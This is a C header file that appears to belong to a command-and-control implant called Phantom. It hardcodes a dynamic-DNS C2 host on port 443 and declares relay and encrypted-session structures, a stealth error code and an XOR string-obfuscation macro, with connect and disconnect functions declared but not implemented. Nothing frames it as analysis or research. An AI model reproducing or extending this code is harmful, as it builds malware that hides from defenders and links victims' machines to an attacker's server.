
#ifndef PHANTOM_H
#define PHANTOM_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <sys/types.h>

extern volatile bool ph_agent_is_busy;

#define PHANTOM_VERSION_MAJOR 3
#define PHANTOM_VERSION_MINOR 0
#define PHANTOM_VERSION_PATCH 0

#define PH_MAX_RELAYS 5
#define PH_BUFFER_SIZE 4096
#define PH_SESSION_KEY_SIZE 32
#define PH_NONCE_SIZE 24
#define PH_MAC_SIZE 16
#define PH_FINGERPRINT_SIZE 16

#define DEFAULT_C2_PORT 443
#define DEFAULT_C2_HOST "bootoyen.duckdns.org"

#define PH_OK 0
#define PH_ERR_NULL_PTR -1
#define PH_ERR_INVALID_ARG -2
#define PH_ERR_MEMORY -3
#define PH_ERR_NETWORK -4
#define PH_ERR_CRYPTO -5
#define PH_ERR_TIMEOUT -6
#define PH_ERR_SOCKET -7
#define PH_ERR_DNS -8
#define PH_ERR_STEALTH -9
#define PH_ERR_SENTINEL -10
#define PH_ERR_PROTOCOL -11

typedef enum {
    PH_SESSION_INIT = 0,
    PH_SESSION_CONNECTING,
    PH_SESSION_CONNECTED,
    PH_SESSION_AUTHENTICATED,
    PH_SESSION_TUNNEL_ACTIVE,
    PH_SESSION_CLOSING,
    PH_SESSION_CLOSED,
    PH_SESSION_ERROR
} ph_session_state_t;

typedef struct {
    char address[256];
    uint16_t port;
    int priority;
    ph_session_state_t state;
} ph_relay_t;

typedef struct {
    ph_session_state_t state;
    uint8_t session_key[PH_SESSION_KEY_SIZE];
    uint8_t nonce[PH_NONCE_SIZE];
    uint64_t nonce_counter;
    ph_relay_t current_relay;
    int socket_fd;
    time_t last_activity;
} ph_session_t;

#define XOR_STR(str) ph_xor_obfuscate(str, sizeof(str) - 1)

int ph_session_init(ph_session_t *session);
int ph_session_connect(ph_session_t *session, const char *address, uint16_t port);
int ph_session_disconnect(ph_session_t *session);
void ph_session_cleanup(ph_session_t *session);

#endif
